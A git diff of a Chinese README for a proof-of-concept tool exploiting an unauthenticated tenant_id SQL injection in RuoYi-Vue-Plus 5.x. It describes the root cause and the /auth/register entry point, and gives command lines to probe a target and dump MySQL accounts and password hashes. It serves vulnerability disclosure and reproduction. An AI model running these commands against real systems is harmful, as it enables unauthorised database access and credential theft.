@@ -1,15 +1,21 @@
-# RuoYi-Vue-Plus tenant_id SQL 注入复现 PoC
+# RuoYi‑Vue‑Plus tenant_id SQL 注入漏洞（XVE‑2026‑50962）
 
 针对 **RuoYi-Vue-Plus 5.x** 多租户 `tenant_id` 未授权 SQL 注入漏洞的复现工具与分析
 
 ## 漏洞概述
 
-| 项 | 说明 |
+| 事项 | 说明 |
 |---|---|
 | 漏洞类型 | 未授权 SQL 注入（报错注入 / 时间盲注） |
 | 触发入口 | `POST /auth/register` 请求体 `tenantId` 字段 |
 | 根因 | `PlusTenantLineHandler.getTenantId()` 使用 `new StringValue(tenantId)` 将外部可控租户 ID 直接拼入 SQL 字面量，不做转义，`#{}` 参数化失效 |
 | 影响 | 无需登录、无需验证码，绕过多租户隔离，可读取/篡改全库数据 |
+
+相关分析报告：
+
+[多租户 tenant_id SQL 注入漏洞分析与应急响应报告](https://mp.weixin.qq.com/s/r0hNmUFo4MsQcZR1OeRfEg)
+
+[RuoYi-Vue-Plus SQL注入漏洞(XVE-2026-50962)](https://mp.weixin.qq.com/s/iWwhEC3HFsk3_y7cHjrkOA)
 
 ## 功能
 
@@ -24,13 +30,13 @@
 ```bash
 pip install requests pycryptodome
 
-# 1) 探测注入是否存在
+# 探测注入是否存在
 python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 probe
 
-#    使用代理
+# 使用代理
 python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy socks5h://<PROXY_IP>:10800 probe
 
-# 2) 获取 MySQL 账号与密码哈希
+# 获取 MySQL 账号与密码哈希
 python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy socks5h://<PROXY_IP>:10800 mysql
 ```
 
